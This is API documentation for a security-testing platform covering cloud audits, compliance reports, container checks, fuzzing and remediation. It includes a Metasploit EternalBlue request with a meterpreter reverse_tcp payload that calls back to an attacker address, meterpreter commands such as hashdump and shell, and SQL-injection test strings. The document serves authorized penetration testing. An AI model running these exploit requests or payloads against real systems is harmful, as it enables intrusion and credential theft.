# OdinForge AI Platform - API Documentation

## Overview

This document provides comprehensive documentation for all OdinForge AI platform API endpoints, including the new Phase 1-3 features: Cloud Penetration Testing, Compliance Reporting, Container Security, Business Logic Fuzzing, Remediation Automation, Tool Integration (Metasploit/Nuclei), and Session Replay.

## Authentication

All API endpoints require authentication via the `X-Admin-Password` header:

```bash
curl -H "X-Admin-Password: YOUR_ADMIN_PASSWORD" https://your-instance/api/endpoint
```

## Rate Limiting

API endpoints are rate-limited to prevent abuse. Default limits apply per IP address.

---

## Table of Contents

1. [Cloud Penetration Testing](#cloud-penetration-testing)
2. [Compliance Reporting](#compliance-reporting)
3. [Container Security](#container-security)
4. [Business Logic Fuzzing](#business-logic-fuzzing)
5. [Remediation Automation](#remediation-automation)
6. [Tool Integration - Metasploit](#tool-integration---metasploit)
7. [Tool Integration - Nuclei](#tool-integration---nuclei)
8. [Session Replay](#session-replay)

---

## Cloud Penetration Testing

Full cloud security testing for AWS, Azure, and GCP including IAM analysis, storage security, network exposure, secrets management, and compute vulnerabilities.

### AWS Full Assessment

**Endpoint:** `POST /api/cloud-pentest/aws/full-assessment`

Performs comprehensive AWS security assessment across all security domains.

**Request Body:**
```json
{
  "accountId": "123456789012",
  "regions": ["us-east-1", "us-west-2"],
  "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "secretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "assessmentOptions": {
    "includeIAM": true,
    "includeStorage": true,
    "includeNetwork": true,
    "includeCompute": true,
    "includeSecrets": true
  }
}
```

**Response:**
```json
{
  "id": "aws-pentest-abc12345",
  "provider": "aws",
  "accountId": "123456789012",
  "status": "completed",
  "startTime": "2026-01-25T10:00:00Z",
  "endTime": "2026-01-25T10:05:32Z",
  "findings": [
    {
      "id": "finding-1",
      "category": "iam",
      "severity": "critical",
      "title": "Root account access keys detected",
      "description": "AWS root account has active access keys which is a security risk",
      "resource": "arn:aws:iam::123456789012:root",
      "recommendation": "Delete root access keys and use IAM users instead",
      "mitreAttackId": "T1078.004",
      "cvssScore": 9.8
    }
  ],
  "attackPaths": [...],
  "statistics": {
    "totalFindings": 15,
    "criticalCount": 2,
    "highCount": 5,
    "mediumCount": 6,
    "lowCount": 2
  }
}
```

### Azure Full Assessment

**Endpoint:** `POST /api/cloud-pentest/azure/full-assessment`

**Request Body:**
```json
{
  "subscriptionId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "tenantId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "clientId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "clientSecret": "your-client-secret",
  "assessmentOptions": {
    "includeIdentity": true,
    "includeStorage": true,
    "includeNetwork": true,
    "includeCompute": true
  }
}
```

### GCP Full Assessment

**Endpoint:** `POST /api/cloud-pentest/gcp/full-assessment`

**Request Body:**
```json
{
  "projectId": "my-gcp-project",
  "serviceAccountKey": { ... },
  "assessmentOptions": {
    "includeIAM": true,
    "includeStorage": true,
    "includeNetwork": true,
    "includeCompute": true
  }
}
```

---

## Compliance Reporting

Multi-framework compliance assessment supporting NIST 800-53, PCI-DSS 4.0, SOC 2, and HIPAA.

### Run Compliance Assessment

**Endpoint:** `POST /api/compliance/assess`

**Request Body:**
```json
{
  "framework": "nist-800-53",
  "organization": "Acme Corp",
  "scope": {
    "assets": ["web-app-1", "database-1", "api-gateway"],
    "environments": ["production", "staging"]
  },
  "controlSubset": ["AC-1", "AC-2", "AU-1", "AU-2"],
  "includeEvidence": true
}
```

**Supported Frameworks:**
- `nist-800-53` - NIST Special Publication 800-53
- `pci-dss-4.0` - Payment Card Industry Data Security Standard v4.0
- `soc2` - Service Organization Control 2
- `hipaa` - Health Insurance Portability and Accountability Act

**Response:**
```json
{
  "id": "compliance-report-xyz789",
  "framework": "nist-800-53",
  "organization": "Acme Corp",
  "assessmentDate": "2026-01-25T10:00:00Z",
  "overallScore": 78.5,
  "status": "completed",
  "controlResults": [
    {
      "controlId": "AC-1",
      "controlName": "Access Control Policy and Procedures",
      "status": "compliant",
      "score": 100,
      "evidence": ["Policy document dated 2025-12-01"],
      "findings": []
    },
    {
      "controlId": "AC-2",
      "controlName": "Account Management",
      "status": "partial",
      "score": 65,
      "evidence": ["IAM configuration export"],
      "findings": [
        {
          "description": "Service accounts lack rotation policy",
          "severity": "medium",
          "recommendation": "Implement 90-day key rotation"
        }
      ]
    }
  ],
  "summary": {
    "totalControls": 50,
    "compliant": 35,
    "partial": 10,
    "nonCompliant": 5,
    "notApplicable": 0
  },
  "recommendations": [...]
}
```

### List Compliance Reports

**Endpoint:** `GET /api/compliance/reports`

**Query Parameters:**
- `framework` (optional) - Filter by framework
- `organization` (optional) - Filter by organization
- `limit` (optional) - Number of results (default: 20)
- `offset` (optional) - Pagination offset

### Get Report Details

**Endpoint:** `GET /api/compliance/reports/:id`

### Export Report

**Endpoint:** `GET /api/compliance/reports/:id/export`

**Query Parameters:**
- `format` - Export format: `html`, `csv`, or `json`

**Example:**
```bash
curl -H "X-Admin-Password: $PASSWORD" \
  "https://your-instance/api/compliance/reports/abc123/export?format=html" \
  -o compliance-report.html
```

---

## Container Security

Advanced container escape detection and Kubernetes abuse testing.

### Container Escape Detection

**Endpoint:** `POST /api/container-security/escape-detection`

Analyzes container configurations for escape vectors.

**Request Body:**
```json
{
  "containerConfig": {
    "image": "nginx:latest",
    "privileged": true,
    "capabilities": ["SYS_ADMIN", "NET_ADMIN"],
    "volumes": [
      {"hostPath": "/var/run/docker.sock", "containerPath": "/var/run/docker.sock"},
      {"hostPath": "/", "containerPath": "/host"}
    ],
    "securityContext": {
      "runAsRoot": true,
      "readOnlyRootFilesystem": false
    },
    "namespaces": {
      "hostPID": true,
      "hostNetwork": true,
      "hostIPC": false
    }
  }
}
```

**Response:**
```json
{
  "id": "escape-analysis-abc123",
  "timestamp": "2026-01-25T10:00:00Z",
  "riskLevel": "critical",
  "escapeVectors": [
    {
      "id": "vector-1",
      "type": "privileged_container",
      "severity": "critical",
      "title": "Privileged Container Mode",
      "description": "Container runs in privileged mode with full host access",
      "exploitability": "trivial",
      "technique": "Mount host filesystem and escape",
      "mitreId": "T1611",
      "remediation": "Remove --privileged flag and use specific capabilities"
    },
    {
      "id": "vector-2",
      "type": "docker_socket_mount",
      "severity": "critical",
      "title": "Docker Socket Mounted",
      "description": "/var/run/docker.sock is accessible inside container",
      "exploitability": "easy",
      "technique": "Use docker CLI to spawn privileged container on host",
      "mitreId": "T1611",
      "remediation": "Remove docker.sock mount, use rootless containers"
    }
  ],
  "detectedVectorCount": 8,
  "recommendations": [
    "Remove privileged mode",
    "Remove docker socket mount",
    "Drop CAP_SYS_ADMIN capability",
    "Disable host PID namespace"
  ]
}
```

**Detected Escape Vectors:**
1. Privileged containers
2. Docker socket mounts
3. CAP_SYS_ADMIN abuse
4. CAP_SYS_PTRACE abuse
5. Host PID namespace
6. Host network namespace
7. Sensitive host mounts (/, /etc, /root)
8. writable /proc or /sys

### Kubernetes Penetration Test

**Endpoint:** `POST /api/container-security/kubernetes/pentest`

**Request Body:**
```json
{
  "clusterConfig": {
    "apiServer": "https://k8s-api.example.com:6443",
    "token": "eyJhbGciOi...",
    "namespace": "default"
  },
  "testOptions": {
    "testApiAbuse": true,
    "testRbacEscalation": true,
    "testNetworkPolicies": true,
    "testSecretExposure": true
  }
}
```

**Response:**
```json
{
  "id": "k8s-pentest-xyz789",
  "timestamp": "2026-01-25T10:00:00Z",
  "findings": [
    {
      "category": "api_abuse",
      "severity": "high",
      "title": "Anonymous API Access Enabled",
      "description": "Kubernetes API allows anonymous authentication",
      "mitreId": "T1552.007",
      "recommendation": "Disable anonymous auth in kube-apiserver"
    },
    {
      "category": "rbac_escalation",
      "severity": "critical",
      "title": "Wildcard Permissions Detected",
      "description": "ClusterRole has * verbs on * resources",
      "resource": "ClusterRole/admin-full",
      "mitreId": "T1078.004"
    }
  ],
  "lateralMovement": {
    "possiblePaths": [...],
    "exposedServices": [...]
  }
}
```

### RBAC Analysis

**Endpoint:** `POST /api/container-security/kubernetes/rbac-analysis`

### Network Policy Analysis

**Endpoint:** `POST /api/container-security/kubernetes/network-policy-analysis`

---

## Business Logic Fuzzing

Workflow fuzzing for detecting race conditions, transaction manipulation, and authentication bypasses.

### Fuzz Workflow

**Endpoint:** `POST /api/business-logic/fuzz-workflow`

**Request Body:**
```json
{
  "workflow": {
    "name": "E-commerce Checkout",
    "steps": [
      {
        "id": "add-to-cart",
        "endpoint": "/api/cart/add",
        "method": "POST",
        "body": {"productId": "{{productId}}", "quantity": 1}
      },
      {
        "id": "apply-coupon",
        "endpoint": "/api/cart/coupon",
        "method": "POST",
        "body": {"code": "{{couponCode}}"}
      },
      {
        "id": "checkout",
        "endpoint": "/api/checkout",
        "method": "POST",
        "body": {"paymentMethod": "card"}
      }
    ],
    "variables": {
      "productId": "prod-123",
      "couponCode": "SAVE20"
    }
  },
  "fuzzingOptions": {
    "stepSkipping": true,
    "parameterTampering": true,
    "concurrentRequests": true,
    "iterations": 100
  }
}
```

**Response:**
```json
{
  "id": "fuzz-result-abc123",
  "workflow": "E-commerce Checkout",
  "status": "completed",
  "findings": [
    {
      "type": "step_skip_vulnerability",
      "severity": "high",
      "description": "Checkout succeeded without payment step",
      "exploitPath": ["add-to-cart", "checkout"],
      "recommendation": "Validate all required steps server-side"
    },
    {
      "type": "parameter_tampering",
      "severity": "critical",
      "description": "Negative quantity accepted (-1)",
      "step": "add-to-cart",
      "originalValue": 1,
      "tamperedValue": -1,
      "recommendation": "Validate quantity >= 1 server-side"
    }
  ],
  "statistics": {
    "totalIterations": 100,
    "vulnerabilitiesFound": 5,
    "uniqueFindings": 3
  }
}
```

### Race Condition Detection

**Endpoint:** `POST /api/business-logic/race-detection`

Detects TOCTOU vulnerabilities and race conditions.

**Request Body:**
```json
{
  "endpoint": "/api/wallet/withdraw",
  "method": "POST",
  "body": {"amount": 100},
  "headers": {"Authorization": "Bearer {{token}}"},
  "concurrentRequests": 50,
  "expectedBehavior": {
    "maxSuccessful": 1,
    "checkEndpoint": "/api/wallet/balance"
  }
}
```

**Response:**
```json
{
  "id": "race-detection-xyz789",
  "vulnerable": true,
  "raceConditionType": "double-spend",
  "details": {
    "requestsSent": 50,
    "successfulRequests": 3,
    "expectedMaxSuccessful": 1,
    "balanceBefore": 100,
    "balanceAfter": -200,
    "overdraftAmount": 200
  },
  "recommendation": "Implement distributed locking or database-level constraints"
}
```

### Transaction Manipulation

**Endpoint:** `POST /api/business-logic/transaction-manipulation`

Tests for price/quantity/ID tampering vulnerabilities.

**Request Body:**
```json
{
  "transactionEndpoint": "/api/orders",
  "method": "POST",
  "baseTransaction": {
    "productId": "prod-123",
    "quantity": 1,
    "price": 99.99
  },
  "manipulations": ["price", "quantity", "productId"]
}
```

### Authentication Bypass

**Endpoint:** `POST /api/business-logic/auth-bypass`

Tests for authentication flow bypasses.

**Request Body:**
```json
{
  "authFlow": {
    "steps": [
      {"name": "login", "endpoint": "/api/auth/login"},
      {"name": "mfa", "endpoint": "/api/auth/mfa"},
      {"name": "verify", "endpoint": "/api/auth/verify"}
    ],
    "protectedResource": "/api/admin/users"
  },
  "testCases": ["step_skip", "token_reuse", "forced_browsing"]
}
```

---

## Remediation Automation

Infrastructure-as-Code fix generation and code patch suggestions.

### Generate IaC Fix

**Endpoint:** `POST /api/remediation/iac-fix`

**Request Body:**
```json
{
  "vulnerabilityType": "s3_public_access",
  "platform": "terraform",
  "resourceDetails": {
    "bucketName": "my-data-bucket",
    "region": "us-east-1",
    "currentConfig": {
      "acl": "public-read",
      "publicAccessBlock": false
    }
  }
}
```

**Supported Vulnerability Types:**
- `s3_public_access` - S3 bucket public access
- `iam_admin_policy` - Overly permissive IAM policies
- `security_group_open` - Open security group rules
- `encryption_disabled` - Unencrypted resources
- `privileged_container` - Privileged Kubernetes containers
- `network_policy_missing` - Missing K8s network policies
- `rbac_overpermissive` - Excessive RBAC permissions

**Supported Platforms:**
- `terraform`
- `cloudformation`
- `kubernetes`

**Response:**
```json
{
  "id": "iac-fix-abc123",
  "vulnerabilityType": "s3_public_access",
  "platform": "terraform",
  "generatedFix": "resource \"aws_s3_bucket_public_access_block\" \"my-data-bucket\" {\n  bucket = aws_s3_bucket.my-data-bucket.id\n  block_public_acls       = true\n  block_public_policy     = true\n  ignore_public_acls      = true\n  restrict_public_buckets = true\n}",
  "explanation": "This Terraform configuration blocks all public access to the S3 bucket",
  "applyInstructions": [
    "1. Add this resource to your Terraform configuration",
    "2. Run terraform plan to review changes",
    "3. Run terraform apply to implement"
  ]
}
```

### Generate Code Patch

**Endpoint:** `POST /api/remediation/code-patch`

**Request Body:**
```json
{
  "vulnerabilityType": "sql_injection",
  "language": "javascript",
  "vulnerableCode": "const query = `SELECT * FROM users WHERE id = ${userId}`;",
  "context": {
    "framework": "express",
    "database": "postgresql"
  }
}
```

**Supported Vulnerability Types:**
- `sql_injection`
- `xss`
- `path_traversal`
- `deserialization`
- `command_injection`

**Response:**
```json
{
  "id": "code-patch-xyz789",
  "vulnerabilityType": "sql_injection",
  "originalCode": "const query = `SELECT * FROM users WHERE id = ${userId}`;",
  "patchedCode": "const query = 'SELECT * FROM users WHERE id = $1';\nconst result = await pool.query(query, [userId]);",
  "explanation": "Use parameterized queries to prevent SQL injection",
  "testCases": [
    "Test with userId = '1 OR 1=1'",
    "Test with userId = '1; DROP TABLE users;--'"
  ]
}
```

### Batch Remediation

**Endpoint:** `POST /api/remediation/batch`

Generate multiple remediations at once.

**Request Body:**
```json
{
  "findings": [
    {"type": "s3_public_access", "resource": "bucket-1"},
    {"type": "iam_admin_policy", "resource": "admin-role"},
    {"type": "security_group_open", "resource": "sg-123"}
  ],
  "platform": "terraform"
}
```

### Create Pull Request

**Endpoint:** `POST /api/remediation/create-pr`

**Request Body:**
```json
{
  "repositoryUrl": "https://github.com/org/repo",
  "branchName": "security-fixes-2026-01",
  "title": "Security: Fix S3 public access and IAM policies",
  "description": "Automated security fixes generated by OdinForge AI",
  "changes": [
    {
      "filePath": "terraform/s3.tf",
      "content": "..."
    }
  ],
  "labels": ["security", "automated"],
  "reviewers": ["security-team"]
}
```

---

## Tool Integration - Metasploit

Integration with Metasploit Framework for exploit execution.

### List Modules

**Endpoint:** `GET /api/tools/metasploit/modules`

**Query Parameters:**
- `type` (optional) - Filter by type: `exploit`, `auxiliary`, `post`

**Response:**
```json
{
  "modules": [
    {
      "name": "ms17_010_eternalblue",
      "fullName": "exploit/windows/smb/ms17_010_eternalblue",
      "type": "exploit",
      "rank": "excellent",
      "description": "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
      "authors": ["Sean Dillon", "Dylan Davis", "Equation Group"],
      "cveIds": ["CVE-2017-0143", "CVE-2017-0144", "CVE-2017-0145"],
      "platform": ["windows"],
      "arch": ["x86", "x64"],
      "targets": ["Windows 7", "Windows 2008 R2", "Windows 2012"],
      "options": [
        {"name": "RHOSTS", "type": "address", "required": true, "description": "Target address"},
        {"name": "RPORT", "type": "port", "required": true, "default": "445", "description": "SMB port"}
      ]
    }
  ],
  "count": 5
}
```

**Available Modules:**
1. `ms17_010_eternalblue` - EternalBlue (CVE-2017-0143/0144/0145)
2. `apache_struts2_content_type_ognl` - Apache Struts2 OGNL Injection (CVE-2017-5638)
3. `weblogic_deserialize` - WebLogic Deserialization (CVE-2017-10271, CVE-2019-2725)
4. `tomcat_mgr_upload` - Tomcat Manager Upload
5. `jenkins_script_console` - Jenkins Script Console RCE (CVE-2018-1000861)

### Search Modules

**Endpoint:** `GET /api/tools/metasploit/modules/search?query=CVE-2017`

### Run Exploit

**Endpoint:** `POST /api/tools/metasploit/exploit`

**Request Body:**
```json
{
  "module": "ms17_010_eternalblue",
  "target": "192.168.1.100",
  "port": 445,
  "options": {},
  "payload": "windows/x64/meterpreter/reverse_tcp",
  "payloadOptions": {
    "LHOST": "192.168.1.50",
    "LPORT": 4444
  }
}
```

**Response:**
```json
{
  "id": "exploit-abc12345",
  "module": "ms17_010_eternalblue",
  "target": "192.168.1.100",
  "port": 445,
  "status": "success",
  "session": {
    "id": "session-xyz789",
    "type": "meterpreter",
    "targetHost": "192.168.1.100",
    "targetPort": 445,
    "moduleUsed": "exploit/windows/smb/ms17_010_eternalblue",
    "createdAt": "2026-01-25T10:00:00Z",
    "status": "active",
    "platform": "windows",
    "arch": "x64",
    "sessionData": {
      "username": "SYSTEM",
      "hostname": "TARGET-PC",
      "workingDirectory": "C:\\Windows\\System32"
    }
  },
  "output": [
    "[*] Starting exploit ms17_010_eternalblue",
    "[*] Target: 192.168.1.100:445",
    "[+] Exploit completed successfully!",
    "[+] Meterpreter session established!"
  ],
  "timing": {
    "startTime": "2026-01-25T10:00:00Z",
    "endTime": "2026-01-25T10:00:02Z",
    "durationMs": 2000
  },
  "vulnerabilityInfo": {
    "cveId": "CVE-2017-0143",
    "cvssScore": 9.8,
    "description": "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption"
  },
  "mitreAttackMappings": [
    {"techniqueId": "T1210", "techniqueName": "Exploitation of Remote Services", "tactic": "lateral-movement"},
    {"techniqueId": "T1190", "techniqueName": "Exploit Public-Facing Application", "tactic": "initial-access"}
  ]
}
```

### List Sessions

**Endpoint:** `GET /api/tools/metasploit/sessions`

### Execute Session Command

**Endpoint:** `POST /api/tools/metasploit/sessions/:sessionId/exec`

**Request Body:**
```json
{
  "command": "sysinfo"
}
```

**Response:**
```json
{
  "output": [
    "meterpreter > sysinfo",
    "Computer    : TARGET-PC",
    "OS          : Windows Server 2016 (Build 14393)",
    "Architecture: x64",
    "Domain      : WORKGROUP",
    "Meterpreter : meterpreter x64/windows"
  ]
}
```

**Common Meterpreter Commands:**
- `sysinfo` - System information
- `getuid` - Current user
- `pwd` - Working directory
- `hashdump` - Dump password hashes
- `shell` - Open system shell

---

## Tool Integration - Nuclei

Nuclei template execution for vulnerability scanning.

### List Templates

**Endpoint:** `GET /api/tools/nuclei/templates`

**Query Parameters:**
- `tags` (optional) - Comma-separated tags: `cve,rce,misconfig`
- `severity` (optional) - Comma-separated severities: `critical,high,medium,low,info`

**Response:**
```json
{
  "templates": [
    {
      "id": "cve-2021-44228-log4j-rce",
      "name": "Apache Log4j RCE (Log4Shell)",
      "author": "pdteam",
      "severity": "critical",
      "description": "Apache Log4j2 <= 2.14.1 JNDI features...",
      "tags": ["cve", "cve2021", "rce", "log4j", "apache", "jndi"],
      "type": "http",
      "cveIds": ["CVE-2021-44228"],
      "cweIds": ["CWE-502"]
    }
  ],
  "count": 10
}
```

**Built-in Templates:**
1. `cve-2021-44228-log4j-rce` - Log4Shell (Critical)
2. `cve-2023-22515-atlassian-confluence-unauth-rce` - Confluence RCE (Critical)
3. `cve-2024-1708-screenconnect-auth-bypass` - ScreenConnect Auth Bypass (Critical)
4. `exposed-git-directory` - Git Config Exposure (High)
5. `exposed-env-file` - .env File Disclosure (High)
6. `springboot-actuator-env` - Spring Actuator Exposure (High)
7. `apache-struts-devmode` - Struts DevMode (Medium)
8. `wordpress-xmlrpc-listmethods` - WordPress XML-RPC (Medium)
9. `http-missing-security-headers` - Missing Headers (Info)
10. `ssl-dns-names` - SSL Certificate Info (Info)

### Run Nuclei Scan

**Endpoint:** `POST /api/tools/nuclei/scan`

**Request Body:**
```json
{
  "target": "https://example.com",
  "templates": ["cve-2021-44228-log4j-rce", "exposed-git-directory"],
  "tags": ["cve", "exposure"],
  "severity": ["critical", "high"],
  "excludeTags": ["dos"],
  "rateLimit": 100,
  "concurrency": 25,
  "timeout": 30
}
```

**Response:**
```json
{
  "id": "nuclei-scan-abc123",
  "target": "https://example.com",
  "templatesUsed": ["cve-2021-44228-log4j-rce", "exposed-git-directory"],
  "scanStartTime": "2026-01-25T10:00:00Z",
  "scanEndTime": "2026-01-25T10:01:30Z",
  "findings": [
    {
      "id": "finding-xyz789",
      "templateId": "exposed-git-directory",
      "templateName": "Git Config Exposure",
      "severity": "high",
      "type": "http",
      "matchedAt": "https://example.com/.git/config",
      "description": "Git repository configuration file is publicly accessible",
      "remediation": "Block access to .git directory in web server configuration",
      "extractedData": ["[core]", "repositoryformatversion = 0"],
      "curlCommand": "curl -k \"https://example.com/.git/config\"",
      "tags": ["exposure", "git", "config"],
      "mitreId": "T1213"
    }
  ],
  "statistics": {
    "totalTemplates": 2,
    "templatesMatched": 1,
    "totalRequests": 10,
    "duration": 90000,
    "findingsBySeverity": {
      "critical": 0,
      "high": 1,
      "medium": 0,
      "low": 0,
      "info": 0
    }
  },
  "recommendations": [
    "HIGH PRIORITY: Remediate 1 high severity findings within 7 days",
    "Block access to version control directories (.git, .svn, .hg)",
    "Schedule regular vulnerability scanning with Nuclei"
  ]
}
```

---

## Session Replay

Full exploit session recording with forensic-quality evidence collection.

### Create Session

**Endpoint:** `POST /api/sessions/create`

**Request Body:**
```json
{
  "name": "Penetration Test - Production Environment",
  "target": "https://app.example.com",
  "assessor": "Security Team",
  "organization": "Acme Corp",
  "scope": ["app.example.com", "api.example.com"],
  "tools": ["nmap", "nuclei", "metasploit"],
  "notes": "Quarterly security assessment"
}
```

**Response:**
```json
{
  "id": "session-abc123",
  "name": "Penetration Test - Production Environment",
  "target": "https://app.example.com",
  "startTime": "2026-01-25T10:00:00Z",
  "status": "recording",
  "events": [],
  "findings": [],
  "networkTraffic": [],
  "evidence": [],
  "timeline": [],
  "attackPath": [],
  "metadata": {
    "assessor": "Security Team",
    "organization": "Acme Corp",
    "scope": ["app.example.com", "api.example.com"],
    "tools": ["nmap", "nuclei", "metasploit"],
    "notes": "Quarterly security assessment"
  }
}
```

### List Sessions

**Endpoint:** `GET /api/sessions`

**Query Parameters:**
- `status` (optional) - Filter by status: `recording`, `completed`, `failed`

### Get Session Details

**Endpoint:** `GET /api/sessions/:sessionId`

### Add Event to Session

**Endpoint:** `POST /api/sessions/:sessionId/events`

**Request Body:**
```json
{
  "type": "action",
  "source": "nmap",
  "description": "Port scan completed: 22, 80, 443 open",
  "data": {
    "openPorts": [22, 80, 443],
    "duration": 45000
  }
}
```

**Event Types:**
- `action` - Tool execution or user action
- `response` - Server/target response
- `finding` - Vulnerability discovered
- `error` - Error encountered
- `note` - Manual note

### Stop Recording

**Endpoint:** `POST /api/sessions/:sessionId/stop`

### Get Session Playback

**Endpoint:** `GET /api/sessions/:sessionId/playback`

**Query Parameters:**
- `startTime` (optional) - Start offset in milliseconds
- `endTime` (optional) - End offset in milliseconds
- `eventTypes` (optional) - Comma-separated event types
- `speed` (optional) - Playback speed multiplier

**Response:**
```json
{
  "sessionId": "session-abc123",
  "totalDuration": 3600000,
  "currentPosition": 0,
  "playbackSpeed": 1,
  "events": [
    {
      "id": "event-1",
      "offsetMs": 0,
      "type": "action",
      "content": {
        "source": "system",
        "description": "Session started"
      }
    },
    {
      "id": "event-2",
      "offsetMs": 5000,
      "type": "action",
      "content": {
        "source": "nmap",
        "description": "Starting port scan"
      }
    }
  ]
}
```

### Get Network Visualization

**Endpoint:** `GET /api/sessions/:sessionId/network`

**Response:**
```json
{
  "sessionId": "session-abc123",
  "nodes": [
    {"id": "10.0.0.50", "label": "10.0.0.50", "type": "attacker"},
    {"id": "192.168.1.100", "label": "192.168.1.100", "type": "target"}
  ],
  "edges": [
    {
      "id": "edge-1",
      "source": "10.0.0.50",
      "target": "192.168.1.100",
      "protocol": "HTTP",
      "port": 443,
      "requestCount": 150
    }
  ],
  "statistics": {
    "totalRequests": 150,
    "uniqueHosts": 2,
    "protocols": ["HTTP", "HTTPS"],
    "totalBytes": 1250000
  }
}
```

### Get Evidence Chain

**Endpoint:** `GET /api/sessions/:sessionId/evidence-chain`

**Response:**
```json
{
  "sessionId": "session-abc123",
  "chainLength": 15,
  "links": [
    {
      "id": "timeline-1",
      "timestamp": "2026-01-25T10:00:00Z",
      "phase": "recon",
      "action": "DNS enumeration",
      "result": "Completed successfully",
      "success": true,
      "evidence": [],
      "findings": [],
      "mitreMapping": null
    },
    {
      "id": "timeline-5",
      "timestamp": "2026-01-25T10:15:00Z",
      "phase": "exploitation",
      "action": "SQL injection testing",
      "result": "Vulnerability confirmed",
      "success": true,
      "evidence": [
        {
          "id": "evidence-1",
          "type": "log",
          "title": "SQL Error Response",
          "description": "Database error message exposed",
          "hash": "abc123def456"
        }
      ],
      "findings": [
        {
          "id": "finding-1",
          "severity": "high",
          "title": "SQL Injection",
          "cveId": null
        }
      ],
      "mitreMapping": {
        "mitreId": "T1190",
        "technique": "Exploit Public-Facing Application"
      }
    }
  ],
  "integrityHash": "a1b2c3d4e5f6"
}
```

### Create Simulated Session (Demo)

**Endpoint:** `POST /api/sessions/simulate`

Creates a demo session with sample data for testing.

**Request Body:**
```json
{
  "target": "https://demo-target.example.com"
}
```

**Response:** Full session object with simulated events, findings, timeline, network traffic, and evidence chain.

---

## Timeline Phases

Sessions track activities across 5 attack phases:

1. **Recon** - Information gathering, OSINT, DNS enumeration
2. **Scanning** - Port scanning, service detection, OS fingerprinting
3. **Enumeration** - Directory bruteforce, application fingerprinting
4. **Exploitation** - Vulnerability exploitation, payload delivery
5. **Post-Exploitation** - Privilege escalation, lateral movement, data exfiltration

---

## MITRE ATT&CK Mappings

All findings and attack paths are mapped to MITRE ATT&CK techniques:

| Technique ID | Name | Tactic |
|--------------|------|--------|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1210 | Exploitation of Remote Services | Lateral Movement |
| T1078 | Valid Accounts | Defense Evasion |
| T1552 | Unsecured Credentials | Credential Access |
| T1611 | Escape to Host | Privilege Escalation |
| T1059 | Command and Scripting Interpreter | Execution |

---

## Error Handling

All endpoints return consistent error responses:

```json
{
  "error": "Error message describing the issue",
  "code": "ERROR_CODE",
  "details": {}
}
```

**Common HTTP Status Codes:**
- `200` - Success
- `400` - Bad Request (missing/invalid parameters)
- `401` - Unauthorized (missing/invalid auth)
- `404` - Not Found
- `429` - Rate Limit Exceeded
- `500` - Internal Server Error

---

## Best Practices

1. **Always use HTTPS** for API calls
2. **Rotate API credentials** regularly
3. **Monitor rate limits** in production
4. **Store session IDs** for audit trails
5. **Export compliance reports** for retention
6. **Review evidence chains** for forensic purposes
7. **Map findings to MITRE ATT&CK** for threat intelligence

---

## Support

For questions or issues, contact the security team or submit a support ticket.
